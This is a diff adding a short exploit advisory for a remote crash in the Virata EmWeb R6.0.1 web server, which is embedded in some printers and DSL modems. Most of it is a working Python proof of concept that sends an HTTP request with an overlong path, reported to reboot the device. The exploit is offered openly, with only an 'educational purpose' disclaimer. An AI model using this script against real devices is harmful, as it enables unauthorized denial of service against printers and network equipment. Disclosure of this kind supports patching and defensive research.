@@ -1,0 +1,36 @@
+# Exploit Title: Virata EmWeb R6.0.1 Remote Crash Vulnerability
+# Date: 06/04/10
+# Author: Jobert Abma (Online 24)
+# Email: j.abma[at]online24[dot]nl
+# Version: R6.0.1
+# Tested on: linux
+# CVE :()
+# Code :
+
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+- Exploit -
+
+The Virata EmWeb software is embedded in multiple printers and DSL modems. For
+example the HP Color LaserJet 2800-series. When sending a long header (long 
+filename), the printer will reboot. Other soft- and hardware isn't tested yet.
+
+- POC -
+
+#!/usr/bin/python
+
+import socket
+
+host   = '192.168.1.110'
+port   = 80
+header = 'GET /' + ('A'*512) + ' HTTP/1.0\r\nHost: ' + host + '\r\nConnection: Close\r\n\r\n'
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+
+print 'Sending header...'
+
+s.send(header)
+
+print 'Done!'
